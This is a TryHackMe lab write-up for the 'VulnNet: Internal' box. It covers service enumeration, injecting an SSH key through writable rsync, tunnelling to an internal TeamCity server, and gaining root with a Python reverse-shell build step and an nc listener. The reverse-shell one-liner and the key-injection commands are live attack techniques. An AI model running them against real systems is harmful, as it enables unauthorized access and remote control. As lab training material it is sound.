# VulnNet: Internal — TryHackMe Write-Up

## 1. Enumeration
### 1.1 Nmap Scan
Run a full TCP port scan to identify open services:
nmap -p- --min-rate 1000 -T4 -oN full_scan.txt <TARGET_IP>
Then run a targeted script and version scan:
nmap -sC -sV -p 22,111,139,445,873,2049,6379,9090,37651,49513,43563,59199 -oN targeted_scan.txt <TARGET_IP>
**Findings:**
- 22/tcp — OpenSSH
- 111/tcp — RPCbind
- 139, 445/tcp — SMB
- 873/tcp — rsync
- 2049/tcp — NFS
- 6379/tcp — Redis
- 9090/tcp — HTTP service
- 8111/tcp (localhost only) — JetBrains TeamCity
- Multiple mountd/nlockmgr RPC services

## 2. SMB Enumeration
List available shares without credentials:
smbclient -L //<TARGET_IP> -N
Access shares anonymously:
smbclient //<TARGET_IP>/<share_name> -N
Found text notes: “We’re waiting for the DOCUMENT…” and “Purge regularly data that is not needed anymore”.

## 3. NFS Enumeration
List NFS exports:
showmount -e <TARGET_IP>
Mount an export:
mkdir /tmp/nfs
sudo mount -t nfs <TARGET_IP>:/ /tmp/nfs
Explored contents — found `/tmp/rsyncloot/sys-internal/.mozilla/firefox/` with `key4.db` but no `logins.json`.

## 4. Rsync Enumeration
List rsync modules:
rsync rsync://<TARGET_IP>
Found `/files` containing `/sys-internal/.ssh/` directory.

## 5. SSH Key Injection via Rsync
Generate SSH keypair:
ssh-keygen -t rsa -b 4096
Copy public key to authorized_keys:
cp ~/.ssh/id_rsa.pub authorized_keys
Upload via rsync:
rsync -a authorized_keys rsync://rsync-connect@<TARGET_IP>/files/sys-internal/.ssh/
SSH into the box:
ssh -i ~/.ssh/id_rsa sys-internal@<TARGET_IP>

## 6. Local Enumeration
Checked running services:
ss -ltnp | egrep '8111|9090'
Found TeamCity running on 127.0.0.1:8111 (localhost only).

## 7. SSH Tunnel to TeamCity
Forward port 8111 to local machine:
ssh -L 8111:localhost:8111 sys-internal@<TARGET_IP> -fN
Access via browser:
http://localhost:8111
Discovered TeamCity login page.

## 8. Gaining Command Execution via TeamCity
Logged into TeamCity (using accessible credentials or misconfig).
Created a new Build Configuration.
Added a Build Step → Custom Script → Python reverse shell:
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<YOUR_IP>",<YOUR_PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
Started listener:
nc -lvnp <YOUR_PORT>
Triggered build and received reverse shell as root.

## 9. Root Access
Confirmed root privileges:
whoami
id
Extracted proof:
cat /root/root.txt

## Notes & Enumeration Tips
- Always enumerate SMB, NFS, and rsync when present — these services often leak credentials or writable directories.
- Rsync writable `.ssh/authorized_keys` is a direct SSH entry vector.
- Internal-only ports (like 8111) can be accessed via SSH tunneling.
- CI/CD tools like TeamCity can often be exploited for RCE via build scripts.
